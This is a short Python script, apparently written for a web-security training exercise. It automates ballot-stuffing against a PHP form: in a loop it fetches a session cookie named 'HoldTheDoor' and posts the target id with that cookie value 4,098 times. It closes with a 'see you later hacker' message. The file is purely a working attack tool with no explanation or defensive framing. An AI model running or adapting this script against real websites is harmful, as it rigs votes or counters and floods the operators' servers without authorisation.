#!/usr/bin/python3

import requests, sys

argv = sys.argv
#url = 'http://158.69.76.135/level1.php'

def validate(id):
    
    if (type(id) != int):
        id = int(id)
    return id

def do_connection():

    try:
        response = session.get(url)
        print("session was get with persistent")
    except:
        raise ValueError("error")

    try:
        cookie = dict(session.cookies)
        print("getting cookies")
        return cookie
    except:
        print("error")


if len(argv) == 3:

    id = argv[1]
    url = argv[2]

    id = validate(id)

    session = requests.Session()

    for num in range(4098):
        cookie = do_connection()

    #pass the key in the cookie dict with the coockie key-value	
        my_obj = {"id": id,
            "holdthedoor": "Submit",
            "key": cookie['HoldTheDoor']}
    
    #sende the response to the url passin the data
        response = session.post(url, my_obj);
        print("Success: {}".format(num))

print("Well Done. See you later hacker 8)")
